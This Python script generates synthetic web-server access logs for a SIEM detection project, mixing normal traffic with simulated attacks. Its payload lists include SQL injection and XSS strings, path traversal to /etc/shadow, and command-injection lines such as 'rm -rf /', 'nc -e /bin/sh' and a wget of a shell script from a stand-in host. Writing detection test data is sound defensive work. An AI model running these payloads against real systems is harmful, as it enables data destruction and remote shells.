"""
Log Generator for Sentinel SIEM
Generates realistic Apache/Nginx web server logs with attack patterns
"""

from faker import Faker
import random
from datetime import datetime, timedelta
import os

fake = Faker()

# Configuration
NUM_NORMAL_LOGS = 10000
NUM_ATTACK_LOGS = 3000
OUTPUT_FILE = "logs/web_access.log"

# Attack patterns
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
    "'; DROP TABLE users--",
    "' OR 'x'='x",
    "1' UNION SELECT * FROM users--"
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "<svg/onload=alert('xss')>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert('xss')>"
]

DIRECTORY_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system.ini",
    "....//....//....//etc/passwd",
    "..//..//..//etc/shadow",
    "../../../../../../etc/hosts"
]

COMMAND_INJECTION = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "; rm -rf /",
    "| nc -e /bin/sh",
    "&& wget malicious.com/shell.sh"
]

# Common paths
NORMAL_PATHS = [
    "/", "/index.html", "/about.html", "/contact.html", 
    "/products", "/services", "/blog", "/login",
    "/api/users", "/api/products", "/assets/style.css",
    "/assets/script.js", "/images/logo.png"
]

ADMIN_PATHS = [
    "/admin", "/admin/login", "/admin/dashboard",
    "/wp-admin", "/phpmyadmin", "/administrator",
    "/admin/config", "/admin/users"
]

# HTTP status codes
STATUS_CODES = {
    "normal": [200, 200, 200, 200, 304, 301, 302],
    "auth_fail": [401, 403],
    "not_found": [404],
    "error": [500, 502, 503]
}

# User agents
USER_AGENTS = {
    "normal": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ],
    "scanner": [
        "Nikto/2.1.6",
        "sqlmap/1.0",
        "WPScan/3.8.7",
        "Nmap Scripting Engine",
        "python-requests/2.25.1"
    ]
}

def generate_timestamp(start_date, end_date):
    """Generate random timestamp between two dates"""
    time_delta = end_date - start_date
    random_seconds = random.randint(0, int(time_delta.total_seconds()))
    return start_date + timedelta(seconds=random_seconds)

def generate_normal_log():
    """Generate normal benign web access log"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(days=1),
        datetime.now()
    )
    method = random.choice(["GET", "POST", "GET", "GET"])  # GET more common
    path = random.choice(NORMAL_PATHS)
    status = random.choice(STATUS_CODES["normal"])
    size = random.randint(200, 5000)
    user_agent = random.choice(USER_AGENTS["normal"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
    return log

def generate_brute_force_log():
    """Generate brute force attack pattern - multiple failed logins"""
    attacker_ip = fake.ipv4()
    base_time = generate_timestamp(
        datetime.now() - timedelta(hours=2),
        datetime.now()
    )
    
    logs = []
    # Generate 10-20 failed login attempts from same IP
    num_attempts = random.randint(10, 20)
    for i in range(num_attempts):
        timestamp = base_time + timedelta(seconds=i*2)  # 2 seconds apart
        status = random.choice(STATUS_CODES["auth_fail"])
        user_agent = random.choice(USER_AGENTS["normal"])
        
        log = f'{attacker_ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /login HTTP/1.1" {status} 1234 "-" "{user_agent}"'
        logs.append(log)
    
    return logs

def generate_sql_injection_log():
    """Generate SQL injection attempt"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(hours=3),
        datetime.now()
    )
    payload = random.choice(SQL_INJECTION_PAYLOADS)
    path = f"/search?q={payload.replace(' ', '+')}"
    status = random.choice([200, 500])  # Sometimes succeeds, sometimes errors
    user_agent = random.choice(USER_AGENTS["scanner"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {status} 2341 "-" "{user_agent}"'
    return log

def generate_xss_log():
    """Generate XSS attempt"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(hours=3),
        datetime.now()
    )
    payload = random.choice(XSS_PAYLOADS)
    path = f"/comment?text={payload.replace(' ', '+')}"
    status = random.choice([200, 403])
    user_agent = random.choice(USER_AGENTS["scanner"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST {path} HTTP/1.1" {status} 1523 "-" "{user_agent}"'
    return log

def generate_directory_traversal_log():
    """Generate directory traversal attempt"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(hours=4),
        datetime.now()
    )
    payload = random.choice(DIRECTORY_TRAVERSAL)
    path = f"/download?file={payload}"
    status = random.choice([403, 404, 500])
    user_agent = random.choice(USER_AGENTS["scanner"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {status} 891 "-" "{user_agent}"'
    return log

def generate_command_injection_log():
    """Generate command injection attempt"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(hours=2),
        datetime.now()
    )
    payload = random.choice(COMMAND_INJECTION)
    path = f"/ping?host=localhost{payload.replace(' ', '+')}"
    status = random.choice([200, 500])
    user_agent = random.choice(USER_AGENTS["scanner"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {status} 1234 "-" "{user_agent}"'
    return log

def generate_port_scan_log():
    """Generate port scanning pattern - sequential requests to different ports/paths"""
    scanner_ip = fake.ipv4()
    base_time = generate_timestamp(
        datetime.now() - timedelta(hours=5),
        datetime.now()
    )
    
    logs = []
    # Scan multiple admin paths quickly
    paths = ADMIN_PATHS + [f"/api/v{i}" for i in range(1, 6)]
    for i, path in enumerate(paths):
        timestamp = base_time + timedelta(seconds=i*0.5)  # Very fast
        status = random.choice(STATUS_CODES["not_found"])
        user_agent = random.choice(USER_AGENTS["scanner"])
        
        log = f'{scanner_ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {status} 345 "-" "{user_agent}"'
        logs.append(log)
    
    return logs

def generate_credential_stuffing_log():
    """Generate credential stuffing - same password, different usernames"""
    attacker_ip = fake.ipv4()
    base_time = generate_timestamp(
        datetime.now() - timedelta(hours=1),
        datetime.now()
    )
    
    logs = []
    usernames = [fake.user_name() for _ in range(15)]
    for i, username in enumerate(usernames):
        timestamp = base_time + timedelta(seconds=i*3)
        status = random.choice(STATUS_CODES["auth_fail"])
        user_agent = random.choice(USER_AGENTS["normal"])
        
        log = f'{attacker_ip} - {username} [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /login HTTP/1.1" {status} 987 "-" "{user_agent}"'
        logs.append(log)
    
    return logs

def generate_dos_log():
    """Generate application-layer DoS - excessive requests from single IP"""
    attacker_ip = fake.ipv4()
    base_time = generate_timestamp(
        datetime.now() - timedelta(minutes=30),
        datetime.now()
    )
    
    logs = []
    # 100+ requests in short time
    for i in range(100):
        timestamp = base_time + timedelta(seconds=i*0.1)  # 10 req/sec
        path = random.choice(NORMAL_PATHS)
        status = random.choice([200, 503])  # Sometimes server overloaded
        user_agent = random.choice(USER_AGENTS["scanner"])
        
        log = f'{attacker_ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {status} 2341 "-" "{user_agent}"'
        logs.append(log)
    
    return logs

def generate_suspicious_file_upload_log():
    """Generate suspicious file upload attempts (web shells)"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(hours=2),
        datetime.now()
    )
    
    # Suspicious file extensions
    suspicious_files = [
        "shell.php",
        "backdoor.jsp",
        "cmd.aspx",
        "webshell.php",
        "c99.php",
        "r57.php",
        "exploit.php",
        "upload.php.txt"  # Double extension trick
    ]
    
    filename = random.choice(suspicious_files)
    path = f"/upload?file={filename}"
    status = random.choice([200, 403])  # Sometimes blocked
    user_agent = random.choice(USER_AGENTS["scanner"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST {path} HTTP/1.1" {status} 1234 "-" "{user_agent}"'
    return log

def generate_privilege_escalation_log():
    """Generate privilege escalation attempts (unauthorized admin access)"""
    ip = fake.ipv4()
    timestamp = generate_timestamp(
        datetime.now() - timedelta(hours=3),
        datetime.now()
    )
    
    # Trying to access admin functions without proper auth
    admin_endpoints = [
        "/admin/users/delete",
        "/admin/config/edit",
        "/api/admin/create_user",
        "/admin/permissions/modify",
        "/admin/system/restart",
        "/wp-admin/user-new.php",
        "/admin/database/export"
    ]
    
    path = random.choice(admin_endpoints)
    status = random.choice([401, 403])  # Unauthorized/Forbidden
    user_agent = random.choice(USER_AGENTS["normal"])
    
    log = f'{ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {path} HTTP/1.1" {status} 567 "-" "{user_agent}"'
    return log

def main():
    print("[*] Sentinel Log Generator Starting...")
    print(f"[*] Generating {NUM_NORMAL_LOGS} normal logs...")
    print(f"[*] Generating {NUM_ATTACK_LOGS} attack logs (8 types)...")
    
    # Create logs directory if it doesn't exist
    os.makedirs("logs", exist_ok=True)
    
    all_logs = []
    
    # Generate normal logs
    for _ in range(NUM_NORMAL_LOGS):
        all_logs.append(generate_normal_log())
    
    # Generate attack logs
    attack_types = {
        "Brute Force": 300,
        "SQL Injection": 400,
        "XSS": 350,
        "Directory Traversal": 300,
        "Command Injection": 250,
        "Port Scanning": 200,
        "Credential Stuffing": 150,
        "DoS": 100,
        "File Upload": 200,        # NEW
        "Privilege Escalation": 250  # NEW
    }
    
    for attack, count in attack_types.items():
        print(f"[*] Generating {attack} attacks: {count} samples")
        
        for _ in range(count // 10):  # Each attack generates multiple logs
            if attack == "Brute Force":
                all_logs.extend(generate_brute_force_log())
            elif attack == "SQL Injection":
                all_logs.append(generate_sql_injection_log())
            elif attack == "XSS":
                all_logs.append(generate_xss_log())
            elif attack == "Directory Traversal":
                all_logs.append(generate_directory_traversal_log())
            elif attack == "Command Injection":
                all_logs.append(generate_command_injection_log())
            elif attack == "Port Scanning":
                all_logs.extend(generate_port_scan_log())
            elif attack == "Credential Stuffing":
                all_logs.extend(generate_credential_stuffing_log())
            elif attack == "DoS":
                all_logs.extend(generate_dos_log())
            elif attack == "File Upload":
                all_logs.append(generate_suspicious_file_upload_log())
            elif attack == "Privilege Escalation":
                all_logs.append(generate_privilege_escalation_log())
    
    # Shuffle to mix normal and attack logs
    random.shuffle(all_logs)
    
    # Write to file
    print(f"[*] Writing {len(all_logs)} total logs to {OUTPUT_FILE}...")
    with open(OUTPUT_FILE, 'w') as f:
        for log in all_logs:
            f.write(log + '\n')
    
    print(f"[+] SUCCESS! Generated {len(all_logs)} logs")
    print(f"[+] File saved: {OUTPUT_FILE}")
    print(f"[+] File size: {os.path.getsize(OUTPUT_FILE) / 1024:.2f} KB")
    
    # Print sample
    print("\n[*] Sample logs (first 5):")
    for log in all_logs[:5]:
        print(f"    {log}")

if __name__ == "__main__":
    main()